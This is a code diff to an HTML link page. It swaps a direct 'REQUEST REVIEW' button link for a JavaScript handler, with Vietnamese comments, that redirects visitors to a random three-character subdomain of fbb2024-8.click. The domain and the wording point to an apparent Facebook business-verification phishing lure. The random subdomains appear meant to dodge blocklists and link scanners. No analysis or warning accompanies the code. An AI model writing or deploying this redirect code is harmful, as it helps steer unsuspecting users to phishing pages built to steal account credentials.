@@ -68,17 +68,38 @@
                             
                             
 <div id="biolink_block_id_4948" data-biolink-block-id="4948" class="col-12 my-2">
-    <a href="https://businessverifycenter.fbb2024-8.click/" data-track-biolink-block-id="4948" target="_self" rel="nofollow" class="btn btn-block btn-primary link-btn link-hover-animation-smooth link-btn-round  animate__animated animate__ animate__false animate__delay-2s" style="background: #4864DD;color: #FFFFFF;border-width: 0px;border-color: #000000;border-style: solid;box-shadow: 0px 0px 20px 0px #00000010;text-align: center;" data-text-color data-border-width data-border-radius data-border-style data-border-color data-border-shadow data-animation data-background-color data-text-alignment>
-        <div class="link-btn-image-wrapper link-btn-round" style="display: none;">
-            <img src="" class="link-btn-image" loading="lazy" />
-        </div>
-
-        <span data-icon>
-                    </span>
-
+    <a href="javascript:void(0);" 
+       class="btn btn-block btn-primary link-btn link-hover-animation-smooth link-btn-round animate__animated animate__delay-2s" 
+       target="_self" 
+       rel="nofollow" 
+       style="background: #4864DD;color: #FFFFFF;" 
+       onclick="redirectToRandomSubdomain()">
         <span data-name>REQUEST REVIEW</span>
     </a>
 </div>
+
+<script>
+    // Hàm sinh chuỗi ngẫu nhiên
+    function generateRandomString(length) {
+        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+        let result = '';
+        for (let i = 0; i < length; i++) {
+            result += characters.charAt(Math.floor(Math.random() * characters.length));
+        }
+        return result;
+    }
+
+    // Hàm điều hướng đến URL với subdomain ngẫu nhiên
+    function redirectToRandomSubdomain() {
+        const randomSub = generateRandomString(3); // Tạo subdomain ngẫu nhiên với 3 ký tự
+        const baseDomain = "fbb2024-8.click"; // Tên miền gốc
+        const randomURL = `https://${randomSub}.${baseDomain}`; // URL hoàn chỉnh
+        
+        // Điều hướng đến URL ngẫu nhiên
+        window.location.href = randomURL;
+    }
+</script>
+
 
                         
                             
